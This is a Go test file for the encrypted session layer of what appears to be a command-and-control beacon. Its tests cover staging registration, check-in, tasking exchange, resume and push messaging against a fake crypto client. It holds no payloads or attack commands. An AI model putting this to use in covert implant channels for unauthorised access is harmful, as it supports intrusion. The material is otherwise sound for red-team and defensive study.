//go:build beaconcrypt && linux && (amd64 || arm64)

package cryptoprovider

import (
	"bytes"
	"encoding/json"
	"errors"
	"sync"
	"testing"

	"github.com/google/uuid"
)

type fakeClient struct {
	claims                       []byte
	encrypts, decrypts, initials int
	closed                       bool
	decryptError                 error
}

func (c *fakeClient) GenerateRegistration() ([]byte, error) { return []byte("registration"), nil }
func (c *fakeClient) ProcessInitialMessage([]byte) ([]byte, error) {
	c.initials++
	return c.claims, nil
}
func (c *fakeClient) EncryptToServer(body []byte) ([]byte, error) {
	c.encrypts++
	return append([]byte("encrypted:"), body...), nil
}
func (c *fakeClient) DecryptServerMessage(body []byte) ([]byte, error) {
	c.decrypts++
	return body, c.decryptError
}
func (c *fakeClient) Close() { c.closed = true }

func fakeSession(t *testing.T) (*beaconcryptSession, *fakeClient) {
	t.Helper()
	native := &fakeClient{}
	session, err := newBeaconcryptSession(native, uuid.NewString())
	if err != nil {
		t.Fatal(err)
	}
	return session, native
}

func stagingReply(t *testing.T, s *beaconcryptSession, native *fakeClient, mutate func(map[string]interface{})) []byte {
	t.Helper()
	claims := map[string]interface{}{"action": "staging", "status": "success", "uuid": uuid.NewString(), "session_id": s.sessionID}
	native.claims, _ = json.Marshal(claims)
	if mutate != nil {
		mutate(claims)
	}
	claims["data"] = []byte("authenticated initial response")
	outer, err := json.Marshal(claims)
	if err != nil {
		t.Fatal(err)
	}
	return encodeFrame(s.payload, outer)
}

func readySession(t *testing.T) (*beaconcryptSession, *fakeClient) {
	t.Helper()
	s, native := fakeSession(t)
	reply := stagingReply(t, s, native, nil)
	if err := s.Register(func([]byte) ([]byte, error) { return reply, nil }); err != nil {
		t.Fatal(err)
	}
	s.callback = uuid.NewString()
	return s, native
}

func TestRegistrationRetainsFrameAcrossLostResponse(t *testing.T) {
	s, native := fakeSession(t)
	reply := stagingReply(t, s, native, nil)
	var original []byte
	if err := s.Register(func(frame []byte) ([]byte, error) {
		original = append([]byte(nil), frame...)
		return nil, errors.New("lost response")
	}); err == nil {
		t.Fatal("transport failure was ignored")
	}
	if err := s.Register(func(frame []byte) ([]byte, error) {
		if !bytes.Equal(frame, original) {
			t.Fatal("registration request changed after transport failure")
		}
		return reply, nil
	}); err != nil {
		t.Fatal(err)
	}
	if native.initials != 1 || s.stage == "" {
		t.Fatal("registration did not authenticate exactly once")
	}
}

func TestRegistrationRejectsUnauthenticatedRouteClaims(t *testing.T) {
	s, native := fakeSession(t)
	reply := stagingReply(t, s, native, func(claims map[string]interface{}) { claims["uuid"] = uuid.NewString() })
	if err := s.Register(func([]byte) ([]byte, error) { return reply, nil }); err == nil {
		t.Fatal("untrusted outer stage UUID was accepted")
	}
	if s.stage != "" || !s.Failed() || !native.closed {
		t.Fatal("claim mismatch did not retire the native session")
	}
}

func TestExchangeRetriesCiphertextAndRejectsReplacement(t *testing.T) {
	s, native := readySession(t)
	var sent []byte
	plaintext := []byte("first application request")
	if _, err := s.Exchange(plaintext, func(frame []byte) ([]byte, error) {
		sent = append([]byte(nil), frame...)
		return nil, errors.New("HTTP reply lost")
	}); err == nil {
		t.Fatal("transport failure was ignored")
	}
	if _, err := s.Exchange([]byte("replacement"), func([]byte) ([]byte, error) {
		t.Fatal("replacement reached transport")
		return nil, nil
	}); err == nil {
		t.Fatal("outstanding ciphertext was replaced")
	}
	response := []byte("authenticated response")
	reply, err := s.Exchange(plaintext, func(frame []byte) ([]byte, error) {
		if !bytes.Equal(frame, sent) {
			t.Fatal("HTTP retry advanced the client ratchet")
		}
		return encodeFrame(s.callback, response), nil
	})
	if err != nil || !bytes.Equal(reply, response) || native.encrypts != 1 || native.decrypts != 1 {
		t.Fatalf("retry failed: encrypts=%d decrypts=%d err=%v", native.encrypts, native.decrypts, err)
	}
}

func TestCheckinRetainsOriginalSnapshotAndValidatesCallback(t *testing.T) {
	s, native := fakeSession(t)
	staging := stagingReply(t, s, native, nil)
	if err := s.Register(func([]byte) ([]byte, error) { return staging, nil }); err != nil {
		t.Fatal(err)
	}
	var original []byte
	if _, _, err := s.CheckIn([]byte("first host snapshot"), func(frame []byte) ([]byte, error) {
		original = append([]byte(nil), frame...)
		return nil, errors.New("lost checkin response")
	}); err == nil {
		t.Fatal("transport failure was ignored")
	}
	callback := uuid.NewString()
	body := []byte(`{"action":"checkin","status":"success","id":"` + callback + `"}`)
	if _, id, err := s.CheckIn([]byte("new host snapshot"), func(frame []byte) ([]byte, error) {
		if !bytes.Equal(frame, original) {
			t.Fatal("checkin retry encrypted a different host snapshot")
		}
		return encodeFrame(s.stage, body), nil
	}); err != nil || id != callback {
		t.Fatalf("checkin retry failed: id=%q err=%v", id, err)
	}
	if _, _, err := s.CheckIn(nil, func([]byte) ([]byte, error) {
		t.Fatal("cached checkin was transmitted again")
		return nil, nil
	}); err != nil || native.encrypts != 1 {
		t.Fatal("checkin was not cached")
	}
}

func TestFrameValidationPrecedesNativeDecrypt(t *testing.T) {
	s, native := readySession(t)
	message := []byte("request")
	if _, err := s.Exchange(message, func([]byte) ([]byte, error) {
		return encodeFrame(uuid.NewString(), []byte("ciphertext")), nil
	}); err == nil || native.decrypts != 0 {
		t.Fatal("wrong route reached the native decrypt operation")
	}
	native.decryptError = errors.New("authentication failed")
	if _, err := s.Exchange(message, func([]byte) ([]byte, error) {
		return encodeFrame(s.callback, []byte("ciphertext")), nil
	}); err == nil || !s.Failed() || !native.closed {
		t.Fatal("native rejection did not retire the session")
	}
}

func TestCompleteExchangesAreSerialized(t *testing.T) {
	s, native := readySession(t)
	var wg sync.WaitGroup
	for range 20 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if _, err := s.Exchange([]byte("message"), func([]byte) ([]byte, error) {
				return encodeFrame(s.callback, []byte("response")), nil
			}); err != nil {
				t.Error(err)
			}
		}()
	}
	wg.Wait()
	if native.encrypts != 20 || native.decrypts != 20 {
		t.Fatal("concurrent requests did not each complete a single exchange")
	}
}

func TestResumeCompletesInterruptedPollBeforeNewMessage(t *testing.T) {
	s, native := readySession(t)
	var original []byte
	if _, err := s.Exchange([]byte("poll with queued task output"), func(frame []byte) ([]byte, error) {
		original = append([]byte(nil), frame...)
		return nil, errors.New("profile stopped during HTTP request")
	}); err == nil {
		t.Fatal("interrupted transport was ignored")
	}
	response := []byte("pending tasking")
	reply, err := s.Resume(func(frame []byte) ([]byte, error) {
		if !bytes.Equal(frame, original) {
			t.Fatal("restarted profile replaced interrupted poll")
		}
		return encodeFrame(s.callback, response), nil
	})
	if err != nil || !bytes.Equal(reply, response) || native.encrypts != 1 || native.decrypts != 1 {
		t.Fatalf("resume failed: %v", err)
	}
	if reply, err := s.Resume(func([]byte) ([]byte, error) {
		t.Fatal("completed exchange was resumed again")
		return nil, nil
	}); err != nil || reply != nil {
		t.Fatalf("idle resume failed: %v", err)
	}
	if _, err := s.Exchange([]byte("next newly collected poll"), func([]byte) ([]byte, error) {
		return encodeFrame(s.callback, []byte("next reply")), nil
	}); err != nil || native.encrypts != 2 {
		t.Fatal("new messages could not follow resumed exchange")
	}
}

func TestPushWriteRetryRetainsCiphertextAndAcceptsUnsolicitedTasks(t *testing.T) {
	s, native := readySession(t)
	var firstFrame []byte
	plaintext := []byte("task output")
	if err := s.SendPush(plaintext, func(frame []byte) error {
		firstFrame = append([]byte(nil), frame...)
		return errors.New("partial TCP write")
	}); err == nil {
		t.Fatal("failed TCP write was ignored")
	}
	if err := s.SendPush([]byte("replacement"), func([]byte) error {
		t.Fatal("replacement reached transport")
		return nil
	}); err == nil {
		t.Fatal("outstanding push message was replaced")
	}
	// Incoming task pushes are independent of outbound transport delivery.
	unsolicited := []byte("unsolicited tasks")
	if body, err := s.ReceivePush(encodeFrame(s.callback, unsolicited)); err != nil || !bytes.Equal(body, unsolicited) {
		t.Fatalf("unsolicited task message rejected: %v", err)
	}
	if err := s.SendPush(plaintext, func(frame []byte) error {
		if !bytes.Equal(frame, firstFrame) {
			t.Fatal("TCP retry advanced the client ratchet")
		}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	if err := s.SendPush([]byte("next output"), func([]byte) error { return nil }); err != nil {
		t.Fatal(err)
	}
	if native.encrypts != 2 || native.decrypts != 1 {
		t.Fatalf("push operations changed ratchets incorrectly: encrypts=%d decrypts=%d", native.encrypts, native.decrypts)
	}
}

func TestPushMessagesRequireCheckinAndAuthenticateRoutes(t *testing.T) {
	s, native := fakeSession(t)
	if err := s.SendPush([]byte("output"), func([]byte) error { return nil }); err == nil || native.encrypts != 0 {
		t.Fatal("push message encrypted before checkin")
	}
	if _, err := s.ReceivePush(encodeFrame(uuid.NewString(), []byte("tasks"))); err == nil || native.decrypts != 0 {
		t.Fatal("push message decrypted before checkin")
	}
	s, native = readySession(t)
	if _, err := s.ReceivePush(encodeFrame(uuid.NewString(), []byte("tasks"))); err == nil || native.decrypts != 0 {
		t.Fatal("wrong callback route reached native decryption")
	}
	native.decryptError = errors.New("invalid authentication")
	if _, err := s.ReceivePush(encodeFrame(s.callback, []byte("tasks"))); err == nil || !s.Failed() || !native.closed {
		t.Fatal("invalid authenticated push message did not retire the native session")
	}
}

func TestPushStartupRetriesItsOwnFrameWithoutReplacingPendingOutput(t *testing.T) {
	s, native := readySession(t)
	announcement := []byte("identify callback route")
	var initial []byte
	if err := s.StartPush(announcement, func(frame []byte) error {
		initial = append([]byte(nil), frame...)
		return errors.New("startup partial write")
	}); err == nil {
		t.Fatal("failed startup write was ignored")
	}
	if err := s.StartPush(announcement, func(frame []byte) error {
		if !bytes.Equal(frame, initial) {
			t.Fatal("startup retry replaced retained ciphertext")
		}
		return nil
	}); err != nil || native.encrypts != 1 {
		t.Fatalf("startup retry failed: encrypts=%d error=%v", native.encrypts, err)
	}
	output := []byte("queued task output")
	if err := s.SendPush(output, func([]byte) error { return errors.New("output partial write") }); err == nil {
		t.Fatal("failed output write was ignored")
	}
	if err := s.StartPush(announcement, func([]byte) error {
		t.Fatal("startup replaced retained task output")
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	if err := s.SendPush(output, func([]byte) error { return nil }); err != nil || native.encrypts != 2 {
		t.Fatalf("original output sender could not resume: encrypts=%d error=%v", native.encrypts, err)
	}
}
